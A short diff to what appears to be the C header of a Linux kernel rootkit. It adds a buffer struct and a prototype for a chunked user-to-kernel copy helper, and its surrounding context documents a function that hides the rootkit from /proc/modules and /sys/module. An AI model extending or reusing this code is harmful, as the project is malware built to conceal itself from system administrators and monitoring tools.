@@ -65,6 +65,11 @@ typedef struct pid_list_tag {
     pid_t i32_pid;         // PID value
 } pid_list_t;
 
+typedef struct buffer_tag {
+    void *p_data;  // Pointer to the buffer data
+    size_t sz_len; // Size of the buffer
+} buffer_t;
+
 struct module_notes_attrs {
     struct kobject *dir;
     unsigned int notes;
@@ -114,6 +119,17 @@ static inline pid_t get_effective_pid(const pid_t i32_pid)
 
     return i32_pid;
 }
+
+/**
+ * Copy data from user space to kernel space, chunk by chunk.
+ * @note Taken from kernel code (kernel/module.c), as it is static.
+ *
+ * @param p_dst    The destination (kernel) buffer
+ * @param p_usrc   The source (user) buffer
+ * @param ui64_len The length of the data to copy
+ * @return 0 on success, otherwise an error code
+ */
+int copy_chunked_from_user(void *p_dst, const void __user *p_usrc, unsigned long ui64_len);
 
 /**
  * Hides the rootkit from /proc/modules and /sys/module/.
